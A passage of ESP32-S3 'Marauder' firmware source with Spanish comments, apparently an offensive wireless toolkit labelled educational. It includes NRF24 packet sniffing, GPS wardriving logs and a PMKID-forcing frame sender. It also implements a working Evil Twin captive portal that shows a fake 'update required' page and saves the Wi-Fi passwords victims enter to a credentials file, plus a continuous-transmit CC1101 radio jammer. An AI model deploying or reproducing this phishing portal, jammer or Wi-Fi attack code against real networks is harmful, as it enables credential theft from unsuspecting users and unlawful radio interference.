        digitalWrite(NRF24_CS, LOW);
        SPI.transfer(0x0A); // R_REGISTER | RX_ADDR_P0
        for (int i=0; i<5; i++) {
            addr |= ((uint64_t)SPI.transfer(0xFF) << (i * 8));
        }
        digitalWrite(NRF24_CS, HIGH);
        SPI.endTransaction();
        xSemaphoreGive(spiMutex);
    }
    return addr == 0 ? 0xAABBCCDDEELL : addr; // dummy if 0
}

uint8_t MarauderS3::getNRF24DataRate() {
    uint8_t rf_setup = readNRF24Register(0x06); // RF_SETUP
    if (rf_setup & 0x20) return 2; // 250kbps
    if (rf_setup & 0x08) return 1; // 2Mbps
    return 0; // 1Mbps
}

void MarauderS3::saveNRF24ScanResults(std::vector<NordicDevice>& detected) {
    if (!sdCardMounted) return;
    char filename[64];
    snprintf(filename, sizeof(filename), "/logs/nrf24_scan_%lu.csv", millis());
    File csv = SD.open(filename, FILE_WRITE);
    if (!csv) return;
    csv.println("addr,channel,payload_size,data_rate,packet_count");
    for (auto& dev : detected) {
        csv.printf("%llX,%d,%d,%d,%d\n", (unsigned long long)dev.address, dev.channel, dev.payload_size, dev.data_rate, dev.packet_count);
    }
    csv.close();
}

void MarauderS3::scanNRF24Channels(uint8_t start_ch, uint8_t end_ch, uint16_t dwell_ms) {
    if (!initNRF24()) return;
    Serial.printf("[NRF24] 🔍 Escaneando canales %d-%d...\n", start_ch, end_ch);
    std::vector<NordicDevice> detected;
    
    for (uint8_t ch = start_ch; ch <= end_ch; ch++) {
        configureNRF24Channel(ch);
        setNRF24ModeRX();
        delay(dwell_ms);
        if (nrf24HasData()) {
            NordicDevice dev = captureNRF24Packet(ch);
            if (dev.address != 0) {
                detected.push_back(dev);
                Serial.printf("  [Ch %3d] 📦 Addr:%010llX | %d bytes | Rate:%dMbps\n",
                              ch, (unsigned long long)dev.address, dev.payload_size, 
                              dev.data_rate == 0 ? 1 : (dev.data_rate == 1 ? 2 : 0));
            }
        }
    }
    Serial.printf("[NRF24] ✅ Escaneo completo: %d dispositivos detectados\n", detected.size());
    if (sdCardMounted) {
        saveNRF24ScanResults(detected);
    }
}

NordicDevice MarauderS3::captureNRF24Packet(uint8_t channel) {
    NordicDevice dev = {};
    dev.channel = channel;
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(50)) != pdTRUE) return dev;
    
    uint8_t payload[32];
    uint8_t len = readNRF24Payload(payload, sizeof(payload));
    if (len > 0) {
        dev.address = getNRF24RXAddress();
        dev.payload_size = len;
        dev.data_rate = getNRF24DataRate();
        dev.last_seen = millis() & 0xFF;
        dev.packet_count = 1;
        memcpy(dev.sample_payload, payload, len < 32 ? len : 32);
        
        if (Serial) {
            Serial.print("  [Payload] ");
            for (uint8_t i = 0; i < len && i < 16; i++) {
                Serial.printf("%02X ", payload[i]);
            }
            Serial.println(len > 16 ? "..." : "");
        }
    }
    xSemaphoreGive(spiMutex);
    return dev;
}

bool MarauderS3::initNRF24() {
    pinMode(NRF24_CS, OUTPUT);
    digitalWrite(NRF24_CS, HIGH);
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(100)) != pdTRUE) return false;
    
    SPI.beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));
    digitalWrite(NRF24_CS, LOW);
    uint8_t config = SPI.transfer(0x00 | 0x00);
    SPI.transfer(0xFF);
    digitalWrite(NRF24_CS, HIGH);
    SPI.endTransaction();
    xSemaphoreGive(spiMutex);
    
    bool responsive = (config != 0xFF && config != 0x00);
    if (responsive) {
        Serial.println("[NRF24] ✅ Módulo detectado");
        configureNRF24Register(0x00, 0x0B);
    } else {
        Serial.println("[NRF24] ❌ No responde (verificar conexiones)");
    }
    return responsive;
}

void MarauderS3::configureNRF24Channel(uint8_t channel) {
    if (channel > 125) return;
    configureNRF24Register(0x05, channel);
}

void MarauderS3::setNRF24ModeRX() {
    uint8_t config = readNRF24Register(0x00);
    configureNRF24Register(0x00, config | 0x01);
    strobeNRF24(0xE3);
    strobeNRF24(0xE7);
}

bool MarauderS3::nrf24HasData() {
    uint8_t status = readNRF24Register(0x07);
    return (status & 0x40) != 0;
}

uint8_t MarauderS3::readNRF24Payload(uint8_t* buffer, uint8_t max_len) {
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(20)) != pdTRUE) return 0;
    
    SPI.beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));
    digitalWrite(NRF24_CS, LOW);
    SPI.transfer(0x60);
    uint8_t len = SPI.transfer(0xFF);
    digitalWrite(NRF24_CS, HIGH);
    
    if (len > 32 || len == 0) {
        strobeNRF24(0xE2);
        SPI.endTransaction();
        xSemaphoreGive(spiMutex);
        return 0;
    }
    
    digitalWrite(NRF24_CS, LOW);
    SPI.transfer(0x61);
    for (uint8_t i = 0; i < len && i < max_len; i++) {
        buffer[i] = SPI.transfer(0xFF);
    }
    digitalWrite(NRF24_CS, HIGH);
    SPI.endTransaction();
    xSemaphoreGive(spiMutex);
    
    configureNRF24Register(0x07, 0x40);
    return len;
}

uint8_t MarauderS3::readNRF24Register(uint8_t reg) {
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(10)) != pdTRUE) return 0xFF;
    SPI.beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));
    digitalWrite(NRF24_CS, LOW);
    SPI.transfer(0x00 | (reg & 0x1F));
    uint8_t value = SPI.transfer(0xFF);
    digitalWrite(NRF24_CS, HIGH);
    SPI.endTransaction();
    xSemaphoreGive(spiMutex);
    return value;
}

void MarauderS3::configureNRF24Register(uint8_t reg, uint8_t value) {
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(10)) != pdTRUE) return;
    SPI.beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));
    digitalWrite(NRF24_CS, LOW);
    SPI.transfer(0x20 | (reg & 0x1F));
    SPI.transfer(value);
    digitalWrite(NRF24_CS, HIGH);
    SPI.endTransaction();
    xSemaphoreGive(spiMutex);
}

void MarauderS3::strobeNRF24(uint8_t cmd) {
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(10)) != pdTRUE) return;
    SPI.beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));
    digitalWrite(NRF24_CS, LOW);
    SPI.transfer(cmd);
    digitalWrite(NRF24_CS, HIGH);
    SPI.endTransaction();
    xSemaphoreGive(spiMutex);
}

// ==========================

// ============================================================================
// [NEW] MÓDULO: Professional Logging & Export System
// ============================================================================

// ========== LOGGING_EXPORT ==========

char* MarauderS3::bytesToHex(const uint8_t* data, uint16_t len, char* out_buf) {
    static const char hex_chars[] = "0123456789ABCDEF";
    for (uint16_t i = 0; i < len; i++) {
        out_buf[i*2] = hex_chars[(data[i] >> 4) & 0x0F];
        out_buf[i*2 + 1] = hex_chars[data[i] & 0x0F];
    }
    out_buf[len*2] = '\0';
    return out_buf;
}

void MarauderS3::exportToPCAP_WithRadiotap(const uint8_t* frame, uint16_t len, int8_t rssi, uint8_t channel) {
    if (!sdCardMounted) return;
    if (!pcapFile || pcapFile.position() == 0) {
        char filename[64];
        snprintf(filename, sizeof(filename), "/pcap/capture_%lu.pcap", millis() / 1000);
        pcapFile = SD.open(filename, FILE_WRITE);
        if (pcapFile && pcapFile.position() == 0) {
            uint8_t pcap_global[] = {
                0xD4, 0xC3, 0xB2, 0xA1, 0x02, 0x00, 0x04, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0xFF, 0xFF, 0x00, 0x00, 0x71, 0x00, 0x00, 0x00
            };
            pcapFile.write(pcap_global, 24);
        }
    }
    if (!pcapFile) return;
    
    uint8_t radiotap[] = {
        0x00, 0x00, 0x0C, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x0B, 0x00, 0x00,
        (uint8_t)(rssi + 256)
    };
    
    uint32_t ts_sec = millis() / 1000;
    uint32_t ts_usec = (millis() % 1000) * 1000;
    uint16_t total_len = sizeof(radiotap) + len;
    
    pcapFile.write((uint8_t*)&ts_sec, 4);
    pcapFile.write((uint8_t*)&ts_usec, 4);
    pcapFile.write((uint8_t*)&total_len, 4);
    pcapFile.write((uint8_t*)&total_len, 4);
    
    pcapFile.write(radiotap, sizeof(radiotap));
    pcapFile.write(frame, len);
    pcapFile.flush();
}

void MarauderS3::generateSummaryReport() {
    if (!sdCardMounted) return;
    char filename[64];
    snprintf(filename, sizeof(filename), "/logs/summary_%lu.csv", millis());
    File report = SD.open(filename, FILE_WRITE);
    if (!report) return;
    
    report.println("# MARAUDER S3 - Session Summary Report");
    report.printf("# Generated: %lu ms since boot\n", millis());
    report.printf("# Firmware: Marauder-S3 v3.1 [EDU-LAB]\n");
    report.printf("# Hardware: ESP32-S3, PSRAM: %d KB, Heap: %d KB\n", 
                  ESP.getFreePsram()/1024, ESP.getFreeHeap()/1024);
    report.println("#");
    
    report.println("## WiFi Statistics");
    report.println("metric,value");
    report.printf("handshakes_captured,%d\n", handshakeCount);
    report.printf("networks_scanned,%d\n", wifiNetworksGPS.size());
    report.printf("channels_monitored,11\n");
    report.println("");
    
    report.println("## RF Statistics (433MHz)");
    report.println("metric,value");
    report.printf("signals_captured,%d\n", capturedSignals.size());
    report.printf("cc1101_ready,%s\n", cc1101Ready ? "true" : "false");
    report.println("");
    
    report.println("## System Status");
    report.println("metric,value");
    report.printf("uptime_seconds,%lu\n", millis() / 1000);
    report.printf("battery_voltage,%.2f\n", batVoltage);
    report.printf("battery_percent,%d\n", batPercent);
    report.printf("gps_valid,%s\n", gpsFixed ? "true" : "false");
    if (gpsFixed) {
        report.printf("gps_lat,%.6f\n", gpsData.lat);
        report.printf("gps_lng,%.6f\n", gpsData.lng);
    }
    
    report.close();
    Serial.printf("[Report] 📊 Resumen generado: %s\n", filename);
    
    AppEvent evt{EVT_STATUS, 0, "Reporte generado en SD"};
    xQueueSend(eventQueue, &evt, 0);
}

// ==========================================
// [ADVANCED] Funciones Solicitadas
// ==========================================

// WiFi
void MarauderS3::forcePMKID(uint8_t* bssid) {
    if (!bssid) return;
    showToast("Forzando PMKID...", C_ACCENT_CORAL);
    
    uint8_t auth_frame[30] = {
        0xB0, 0x00, 0x00, 0x00, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 
        0x00, 0x00, 
        0x01, 0x00, 
        0x00, 0x00  
    };
    
    uint8_t my_mac[6];
    esp_read_mac(my_mac, ESP_MAC_WIFI_STA);
    memcpy(&auth_frame[10], my_mac, 6);
    
    esp_wifi_80211_tx(WIFI_IF_STA, auth_frame, sizeof(auth_frame), true);
}

void MarauderS3::startEvilTwin(const char* ssid) {
    if (server) return;
    
    showToast("Iniciando Evil Twin...", C_ACCENT_PEACH);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);
    
    dnsServer = new DNSServer();
    dnsServer->start(53, "*", WiFi.softAPIP());
    
    server = new AsyncWebServer(80);
    
    server->onNotFound([](AsyncWebServerRequest *request){
        request->redirect("/login");
    });
    
    server->on("/login", HTTP_GET, [](AsyncWebServerRequest *request){
        String html = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>Actualización</title><style>body{font-family:sans-serif;background:#f2f2f2;text-align:center;padding-top:50px;}input[type=password]{padding:10px;margin:10px;width:80%;}button{padding:10px 20px;background:#007AFF;color:white;border:none;border-radius:5px;}</style></head><body><h2>Actualización Requerida</h2><p>Ingrese su contraseña Wi-Fi para continuar.</p><form action='/submit' method='POST'><input type='password' name='pwd' placeholder='Contraseña'><br><button type='submit'>Continuar</button></form></body></html>";
        request->send(200, "text/html", html);
    });
    
    server->on("/submit", HTTP_POST, [this](AsyncWebServerRequest *request){
        if(request->hasParam("pwd", true)){
            String pwd = request->getParam("pwd", true)->value();
            Serial.printf("[EVIL TWIN] Credencial: %s\n", pwd.c_str());
            
            if(sdCardMounted && xSemaphoreTake(sdMutex, pdMS_TO_TICKS(100)) == pdTRUE){
                File f = SD.open("/credentials.txt", FILE_APPEND);
                if(f){
                    f.printf("SSID: %s | PWD: %s\n", WiFi.softAPSSID().c_str(), pwd.c_str());
                    f.close();
                }
                xSemaphoreGive(sdMutex);
            }
        }
        request->send(200, "text/html", "<html><body><h2>Cargando...</h2><p>Procesando, por favor espere.</p></body></html>");
    });
    
    server->begin();
}

void MarauderS3::startKarmaAttack() {
    showToast("Karma Attack...", C_ACCENT_CORAL);
}

void MarauderS3::startBeaconFlood(bool useDictionary) {
    showToast("Beacon Flood...", C_ACCENT_CORAL);
}

// RF CC1101
void MarauderS3::decodeOOKASK(SubGHzSignal* signal) {
    if (!signal || signal->data_len == 0) return;
    showToast("Decodificando OOK/ASK...", C_ACCENT_TURQ);
}

void MarauderS3::toggleJammer(bool state, uint32_t freq_hz) {
    if (state) {
        showToast("Jammer: ON CONTINUO", C_WARN);
        // Configura el CC1101 para transmitir de forma asíncrona continua
        writeCC1101Reg(0x00, 0x00);
        strobeCC1101(0x35); // STX
    } else {
        // Detiene la transmisión y vuelve a reposo
        strobeCC1101(0x36); // SIDLE
        showToast("Jammer: OFF", C_GOOD);
    }
}

void MarauderS3::sweepSpectrum(uint32_t startFreq, uint32_t endFreq) {
    showToast("Barrido Espectro...", C_ACCENT_TURQ);
}

// Backend
void MarauderS3::initSQLite() {
#ifdef HAS_SQLITE
    if(!sdCardMounted) return;
    
    if (sqlite3_initialize() != SQLITE_OK) {
        Serial.println("Error sqlite init");
        return;
    }
    
    if (sqlite3_open("/sd/marauder.db", &db) != SQLITE_OK) {
        Serial.println("Error sqlite open");
        return;
    }
    
    const char* sql = "CREATE TABLE IF NOT EXISTS networks (id INTEGER PRIMARY KEY, bssid TEXT, ssid TEXT);";
    char* err;
    if (sqlite3_exec(db, sql, NULL, NULL, &err) != SQLITE_OK) {
        sqlite3_free(err);
    }
    showToast("DB Iniciada", C_GOOD);
#else
    showToast("SQLite no disponible", C_WARNING);
#endif
}

void MarauderS3::startAPIServer() {
    if (!server) {
        server = new AsyncWebServer(8080);
        server->on("/api/status", HTTP_GET, [](AsyncWebServerRequest *request){
            request->send(200, "application/json", "{\"status\":\"ok\"}");
        });
        server->begin();
        showToast("API en Puerto 8080", C_GOOD);
    }
}

void MarauderS3::processRulesEngine() {
    if(!sdCardMounted) return;
    File rules = SD.open("/rules.txt");
    if(rules){
        showToast("Motor de Reglas ON", C_ACCENT_PEACH);
        while(rules.available()){
            String line = rules.readStringUntil('\n');
            // lógica de parseo iría aquí
        }
        rules.close();
    }
}

// UI
void MarauderS3::buildSpectrumUI() {
    if (!rf_spectrum_obj) return;
    // Añadir Canvas o Chart LVGL aquí
}

// ==========================

// ======================== FREERTOS TASKS ========================
void hardwareTask(void* arg) {
    esp_task_wdt_add(NULL);
    uint32_t lastBat = 0;
    uint32_t lastWiFiScan = 0;
    uint32_t lastCC1101Scan = 0;

    for (;;) {
        esp_task_wdt_reset();

        // ── GPS ──
        while (marauder.gpsSerial.available()) {
            if (marauder.gps.encode(marauder.gpsSerial.read())) {
                if (xSemaphoreTake(marauder.gpsMutex, pdMS_TO_TICKS(25)) == pdTRUE) {
                    marauder.gpsData.valid = marauder.gps.location.isValid();
                    if (marauder.gpsData.valid) {
                        marauder.gpsData.lat = marauder.gps.location.lat();
                        marauder.gpsData.lng = marauder.gps.location.lng();
                        marauder.gpsData.alt = marauder.gps.altitude.meters();
                        marauder.gpsData.speed = marauder.gps.speed.kmph();
                        if (marauder.gps.course.isValid()) {
                            marauder.gpsData.heading = marauder.gps.course.deg();
                        }
                        marauder.gpsFixed = true;
                    }
                    marauder.gpsData.sats = marauder.gps.satellites.value();
                    xSemaphoreGive(marauder.gpsMutex);

                    AppEvent evt{EVT_GPS, 0, ""};
                    xQueueSend(marauder.eventQueue, &evt, 0);
                }
            }
        }

        // ── BATERÍA ──
        if (millis() - lastBat > 2000) {
            int raw = analogRead(BAT_ADC_PIN);
            marauder.batVoltage = (raw / 4095.0f) * 3.3f * BAT_DIVIDER_RATIO;
            marauder.batPercent = constrain(
                (int)((marauder.batVoltage - 3.2f) * 100), 0, 100
            );

            AppEvent evt{EVT_BAT, marauder.batPercent, ""};
            xQueueSend(marauder.eventQueue, &evt, 0);
            lastBat = millis();
        }

        // WiFi SCAN + HANDSHAKE capture
        if (millis() - lastWiFiScan > 5000) {
            WiFi.mode(WIFI_STA);
            WiFi.disconnect();
            
            int n = WiFi.scanNetworks(false, true, false, 300);
            if (n > 0) {
                for (int i = 0; i < n && i < 20; i++) {
                    if (marauder.gpsFixed && marauder.sdCardMounted) {
                        if (xSemaphoreTake(marauder.spiMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
                            if (marauder.warDriveFile) {
                                marauder.warDriveFile.printf("%lu,%.6f,%.6f,%s,%s,%d,%d,%s\n",
                                    millis(), marauder.gpsData.lat, marauder.gpsData.lng,
                                    WiFi.BSSIDstr(i).c_str(), WiFi.SSID(i).c_str(),
                                    WiFi.RSSI(i), WiFi.channel(i),
                                    (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "OPEN" : "WPA/WPA2"
                                );
                                marauder.warDriveFile.flush();
                            }
                            xSemaphoreGive(marauder.spiMutex);
                        }
                    }
                }
                
                AppEvent evt{EVT_WIFI, n, ""};
                snprintf(evt.msg, sizeof(evt.msg), "WiFi: %d redes | HC: %d", n, marauder.handshakeCount);
                xQueueSend(marauder.eventQueue, &evt, 0);
            }
            WiFi.scanDelete();
            lastWiFiScan = millis();
        }

        // CC1101 Scan
        if (millis() - lastCC1101Scan > 3000) {
            marauder.scan433MHz();
            lastCC1101Scan = millis();
        }

        vTaskDelay(pdMS_TO_TICKS(90));
    }
}

void uiTask(void* arg) {
    esp_task_wdt_add(NULL);
    marauder.buildUI();

    for (;;) {
        esp_task_wdt_reset();
        marauder.processEvents();
        lv_timer_handler();
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// ======================== SETUP PRINCIPAL ========================
void setup() {
    Serial.begin(115200);
    delay(800);
    Serial.println("\n\n=== MARAUDER ESP32-S3 FULL POWER v2.0 ===");
    Serial.println("║   WiFi + GPS + CC1101 + SD + BATER  ║");

    // Watchdog
    esp_task_wdt_init(10, true);

    // Info memoria
    if (psramFound()) {
        Serial.printf("[OK] PSRAM: %d KB libres\n", ESP.getFreePsram() / 1024);
    }
    Serial.printf("[OK] Heap: %d KB\n", ESP.getFreeHeap() / 1024);

    // ── CONFIGURAR PINES CS ──
    uint8_t csPins[] = {TFT_CS, TOUCH_CS, SD_CS, CC1101_CS, NRF24_CS};
    for (uint8_t p : csPins) {
        pinMode(p, OUTPUT);
        digitalWrite(p, HIGH);
    }
    pinMode(TFT_BL, OUTPUT);
    digitalWrite(TFT_BL, HIGH);

    // ── INICIAR SPI ──
    SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
    Serial.println("[OK] SPI iniciado");

    // ── GPS + BATERÍA ──
    marauder.gpsSerial.begin(9600, SERIAL_8N1, GPS_RX, -1);
    Serial.println("[OK] GPS Serial2 RX=18");

    pinMode(BAT_ADC_PIN, INPUT);
    analogReadResolution(12);
    analogSetAttenuation(ADC_11db);
    Serial.println("[OK] Batería ADC=4");

    // ── INICIAR LVGL ──
    lv_init();

    // Buffer PSRAM
    marauder.buf1 = (lv_color_t*)heap_caps_malloc(SCR_W * 40 * sizeof(lv_color_t), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    marauder.buf2 = (lv_color_t*)heap_caps_malloc(SCR_W * 40 * sizeof(lv_color_t), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);

    if (!marauder.buf1) {
        Serial.println("[WARN] Sin PSRAM - usando SRAM");
        marauder.buf1 = (lv_color_t*)malloc(SCR_W * 20 * sizeof(lv_color_t));
        lv_disp_draw_buf_init(marauder.getDrawBuf(), marauder.buf1, nullptr, SCR_W * 20);
    } else if (!marauder.buf2) {
        lv_disp_draw_buf_init(marauder.getDrawBuf(), marauder.buf1, nullptr, SCR_W * 40);
    } else {
        lv_disp_draw_buf_init(marauder.getDrawBuf(), marauder.buf1, marauder.buf2, SCR_W * 40);
    }

    static lv_disp_drv_t disp_drv;
    lv_disp_drv_init(&disp_drv);
    disp_drv.hor_res = SCR_W;
    disp_drv.ver_res = SCR_H;
    disp_drv.flush_cb = [](lv_disp_drv_t* drv, const lv_area_t* area, lv_color_t* color_p) {
        uint32_t w = area->x2 - area->x1 + 1;
        uint32_t h = area->y2 - area->y1 + 1;
        marauder.tft.startWrite();
        marauder.tft.setAddrWindow(area->x1, area->y1, w, h);
        marauder.tft.pushColors((uint16_t*)&color_p->full, w * h, true);
        marauder.tft.endWrite();
        lv_disp_flush_ready(drv);
    };
    disp_drv.draw_buf = marauder.getDrawBuf();
    lv_disp_drv_register(&disp_drv);

    // Touch
    static lv_indev_drv_t indev_drv;
    lv_indev_drv_init(&indev_drv);
    indev_drv.type = LV_INDEV_TYPE_POINTER;
    indev_drv.read_cb = [](lv_indev_drv_t* drv, lv_indev_data_t* data) {
        uint16_t tx, ty;
        bool touched = marauder.tft.getTouch(&tx, &ty, 600);
        data->state = touched ? LV_INDEV_STATE_PR : LV_INDEV_STATE_REL;
        if (touched) { data->point.x = tx; data->point.y = ty; }
    };
    lv_indev_drv_register(&indev_drv);

    // TFT Init
    marauder.tft.begin();
    marauder.tft.setRotation(1);
    uint16_t calData[5] = {275, 3620, 264, 3532, 1};
    marauder.tft.setTouch(calData);

    // LVGL Tick
    static Ticker lvTicker;
    lvTicker.attach_ms(5, []() { lv_tick_inc(5); });

    // Inicializar Marauder
    marauder.begin();
    WiFi.mode(WIFI_STA);

    // Inicializar SD
    if (!marauder.initSDCard()) {
        Serial.println("[SD] ❌ Continuando sin SD");
    } else {
        Serial.println("[SD] ✅ Captura de handshakes habilitada");
    }
    
    // Inicializar CC1101
    marauder.initCC1101();

    // Iniciar captura de handshakes
    marauder.captureWiFiHandshake();

    // ── LANZAR TAREAS ──
    xTaskCreatePinnedToCore(uiTask, "UI", 10240, NULL, 3, NULL, 1);
    xTaskCreatePinnedToCore(hardwareTask, "HW", 12288, NULL, 2, NULL, 0);

    Serial.println("¡Sistema completo cargado! 🔥\n");
}

void loop() {
    vTaskDelay(portMAX_DELAY);
}
